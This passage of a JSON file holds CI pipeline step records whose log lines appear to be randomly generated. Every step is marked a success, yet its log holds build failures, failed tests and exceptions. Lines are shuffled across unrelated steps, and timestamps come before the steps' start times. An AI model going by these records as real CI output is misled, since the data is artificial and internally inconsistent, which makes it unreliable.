          "Installing express@4.9.0",
          "Cache hit for key-5247",
          "Installing eslint@4.3.0",
          "[12:00:22] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_api_health (420ms)",
          "WARNING: express has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Cache hit for key-3183",
          "Cache hit for key-1050",
          "  PASS: test_db_connect (229ms)",
          "  PASS: test_cache_hit (352ms)",
          "  PASS: test_user_create (405ms)",
          "Cache hit for key-6429",
          "Cache hit for key-4373",
          "  PASS: test_api_health (306ms)",
          "  PASS: test_auth_login (288ms)",
          "WARNING: jest has known vulnerabilities",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (331ms)",
          "[12:00:22] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Installing axios@4.8.0",
          "Installing axios@5.1.0",
          "Installing axios@3.6.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@4.6.0",
          "Cache hit for key-4019",
          "Installing axios@2.13.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (379ms)",
          "Cache hit for key-6183",
          "Cache hit for key-4961",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-10T12:01:19.729343",
        "finished_at": "2025-12-10T12:01:32.062804",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-5708",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Cache hit for key-2667",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Installing react@1.14.0",
          "Compiling src/utils.go...",
          "Installing jest@3.5.0",
          "[12:00:23] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-9510",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing jest@3.4.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:23] ERROR: Connection failed",
          "Step 6/10: Building",
          "  PASS: test_db_connect (311ms)",
          "Installing express@1.10.0",
          "Installing lodash@1.4.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_auth_login (480ms)",
          "Compiling src/app.ts...",
          "Installing webpack@4.13.0",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (474ms)",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (161ms)",
          "Cache hit for key-6202",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-3783",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 5/10: Building",
          "WARNING: axios has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (286ms)",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (117ms)",
          "  PASS: test_auth_login (397ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:23] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_user_create (41ms)",
          "Installing prettier@3.7.0",
          "  PASS: test_user_create (184ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 test completed",
          "Installing axios@1.12.0",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-1196",
          "  PASS: test_auth_login (25ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Installing express@1.11.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_api_health (76ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (377ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Installing react@1.12.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (164ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-1745",
          "Installing lodash@4.5.0",
          "Installing eslint@5.10.0",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-10T12:01:32.062804",
        "finished_at": "2025-12-10T12:01:36.996188",
        "log_lines": [
          "=== Step: checkout ===",
          "Installing axios@1.0.0",
          "Cache hit for key-4356",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (157ms)",
          "Step 2/10: Building",
          "Cache hit for key-4379",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1607",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] ERROR: Connection failed",
          "  PASS: test_user_create (207ms)",
          "  PASS: test_cache_hit (350ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing eslint@1.20.0",
          "Step 7/10: Building",
          "  PASS: test_auth_login (158ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (449ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2717 build failed with exit code 105",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing prettier@1.5.0",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/main.py...",
          "Cache hit for key-7482",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "  PASS: test_api_health (140ms)",
          "Installing prettier@5.0.0",
          "  PASS: test_db_connect (299ms)",
          "[12:00:23] INFO: Processing request",
          "FAILED: test_db_connect",
          "Cache hit for key-5224",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@4.17.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@1.0.0",
          "Compiling src/app.ts...",
          "Installing lodash@4.0.0",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (150ms)",
          "Compiling src/index.js...",
          "Installing webpack@4.18.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-6333",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-1283",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "  PASS: test_user_create (465ms)",
          "Compiling src/utils.go...",
          "[12:00:23] ERROR: Connection failed",
          "Installing jest@2.14.0",
          "Cache hit for key-5831",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Installing lodash@2.16.0",
          "  PASS: test_cache_hit (115ms)",
          "  PASS: test_cache_hit (389ms)",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_auth_login (330ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7915",
          "[12:00:23] INFO: Processing request",
          "FAILED: test_auth_login",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8297",
          "[12:00:23] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@1.11.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Cache hit for key-1012",
          "\u2713 lint completed",
          "Installing prettier@4.4.0",
          "Compiling src/app.ts...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-10T12:01:36.996188",
        "finished_at": "2025-12-10T12:01:49.329649",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing webpack@1.12.0",
          "  PASS: test_db_connect (322ms)",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "Installing prettier@5.2.0",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@1.16.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-3261",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing webpack@1.17.0",
          "Installing webpack@5.11.0",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@4.10.0",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-8402",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (14ms)",
          "  PASS: test_db_connect (491ms)",
          "[12:00:23] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Installing prettier@4.4.0",
          "Installing lodash@4.3.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (236ms)",
          "Step 8/10: Building",
          "\u2717 build failed with exit code 84",
          "  PASS: test_db_connect (160ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/utils.go...",
          "Installing react@3.10.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/10: Building",
          "Cache hit for key-8560",
          "Step 2/10: Building",
          "Installing express@2.10.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/service.java...",
          "FAILED: test_user_create",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Exception: TypeError",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 test completed",
          "Cache hit for key-6116",
          "\u2713 test completed",
          "Installing jest@3.8.0",
          "Step 5/10: Building",
          "Cache hit for key-2169",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-5816",
          "Installing express@2.0.0",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (23ms)",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "\u2717 build failed with exit code 54",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Installing lodash@2.5.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:23] INFO: Processing request",
          "Installing jest@2.14.0",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_user_create (144ms)",
          "Installing lodash@5.10.0",
          "FAILED: test_api_health",
          "Compiling src/handler.rs...",
          "Installing eslint@1.20.0",
          "  PASS: test_cache_hit (269ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "[12:00:23] ERROR: Connection failed",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-10T12:01:49.329649",
        "finished_at": "2025-12-10T12:02:26.330031",
        "log_lines": [
          "=== Step: build ===",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Cache hit for key-2615",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Installing express@4.20.0",
          "FAILED: test_api_health",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-4805",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing prettier@3.16.0",
          "WARNING: react has known vulnerabilities",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Step 1/10: Building",
          "Installing webpack@2.14.0",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8380",
          "Cache hit for key-1030",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (292ms)",
          "Cache hit for key-9790",
          "Cache hit for key-7120",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_auth_login (354ms)",
          "[12:00:23] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-1600",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_user_create (271ms)",
          "Installing react@5.2.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing lodash@1.11.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "Installing webpack@4.16.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-7361",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_api_health (242ms)",
          "Installing jest@5.5.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_user_create (37ms)",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing eslint@3.18.0",
          "  PASS: test_auth_login (250ms)",
          "  PASS: test_auth_login (106ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-2251",
          "  PASS: test_auth_login (151ms)",
          "Cache hit for key-8888",
          "FAILED: test_cache_hit",
          "WARNING: react has known vulnerabilities",
          "Installing express@5.11.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing lodash@1.20.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (472ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "Cache hit for key-6661",
          "  PASS: test_cache_hit (437ms)",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Installing axios@4.19.0",
          "\u2717 build failed with exit code 89",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/app.ts...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-10T12:02:26.330031",
        "finished_at": "2025-12-10T12:02:38.663492",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Step 2/10: Building",
          "  PASS: test_user_create (223ms)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 test completed",
          "Cache hit for key-3637",
          "  PASS: test_auth_login (138ms)",
          "Installing lodash@2.2.0",
          "Step 1/10: Building",
          "Cache hit for key-4854",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-4524",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (302ms)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-2479",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_db_connect (307ms)",
          "Installing eslint@1.2.0",
          "Cache hit for key-7672",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_api_health (442ms)",
          "Installing axios@2.3.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-8846",
          "Step 10/10: Building",
          "Cache hit for key-4503",
          "\u2713 test completed",
          "Installing react@5.8.0",
          "Cache hit for key-1274",
          "Installing webpack@1.7.0",
          "Installing webpack@5.1.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing jest@2.20.0",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@3.2.0",
          "  PASS: test_user_create (155ms)",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8841",
          "  PASS: test_api_health (58ms)",
          "Step 2/10: Building",
          "Cache hit for key-5052",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing axios@1.8.0",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_api_health",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_api_health (471ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "FAILED: test_cache_hit",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7083",
          "  PASS: test_user_create (401ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (322ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (302ms)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (58ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (499ms)",
          "Installing axios@1.5.0",
          "  PASS: test_db_connect (163ms)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Step 9/10: Building",
          "[12:00:23] ERROR: Connection failed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-6226",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (202ms)",
          "Cache hit for key-7584",
          "Step 9/10: Building",
          "Cache hit for key-3101",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-10T12:02:38.663492",
        "finished_at": "2025-12-10T12:02:43.596876",
        "log_lines": [
          "=== Step: deploy_production ===",
          "  PASS: test_cache_hit (31ms)",
          "Step 2/10: Building",
          "Cache hit for key-2204",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-9151",
          "\u2713 build completed",
          "Cache hit for key-8341",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Installing webpack@5.18.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "  PASS: test_user_create (208ms)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Cache hit for key-7017",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_user_create (378ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_user_create (304ms)",
          "WARNING: express has known vulnerabilities",
          "Installing jest@5.17.0",
          "\u2717 build failed with exit code 58",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing axios@5.13.0",
          "WARNING: express has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-5403",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-1843",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing react@2.5.0",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_db_connect (116ms)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (367ms)",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (450ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-2723",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-4548",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3616",
          "Installing jest@2.2.0",
          "Cache hit for key-3075",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (395ms)",
          "Compiling src/service.java...",
          "Installing jest@5.10.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@2.1.0",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/10: Building",
          "[12:00:23] INFO: Processing request",
          "Installing webpack@4.17.0",
          "Step 6/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-3937",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.20.0",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@5.13.0",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing axios@2.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3080",
          "  PASS: test_api_health (414ms)",
          "Compiling src/app.ts...",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "  PASS: test_user_create (481ms)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-10T12:02:43.596876",
        "finished_at": "2025-12-10T12:03:20.597258",
        "log_lines": [
          "=== Step: unit_tests ===",
          "WARNING: jest has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Installing react@4.14.0",
          "Cache hit for key-4387",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-2722",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 2/10: Building",
          "  PASS: test_auth_login (380ms)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Installing lodash@3.15.0",
          "Installing express@4.10.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing webpack@4.12.0",
          "  PASS: test_api_health (281ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_user_create (354ms)",
          "Cache hit for key-8307",
          "Cache hit for key-9178",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_api_health (391ms)",
          "Installing jest@1.12.0",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-1984",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing prettier@5.19.0",
          "Installing webpack@3.14.0",
          "\u2713 lint completed",
          "Installing jest@5.10.0",
          "FAILED: test_user_create",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Installing axios@5.5.0",
          "  PASS: test_cache_hit (43ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (282ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing webpack@3.18.0",
          "  PASS: test_api_health (7ms)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (432ms)",
          "Compiling src/index.js...",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_auth_login (498ms)",
          "Step 10/10: Building",
          "Installing webpack@2.13.0",
          "  PASS: test_cache_hit (349ms)",
          "Cache hit for key-5734",
          "\u2713 build completed",
          "  PASS: test_db_connect (78ms)",
          "\u2717 build failed with exit code 55",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 6/10: Building",
          "Cache hit for key-4361",
          "  PASS: test_auth_login (66ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (117ms)",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_user_create (28ms)",
          "\u2717 build failed with exit code 125",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] ERROR: Connection failed",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6432",
          "Installing axios@1.15.0",
          "  PASS: test_api_health (188ms)",
          "Installing lodash@1.18.0",
          "  PASS: test_api_health (317ms)",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
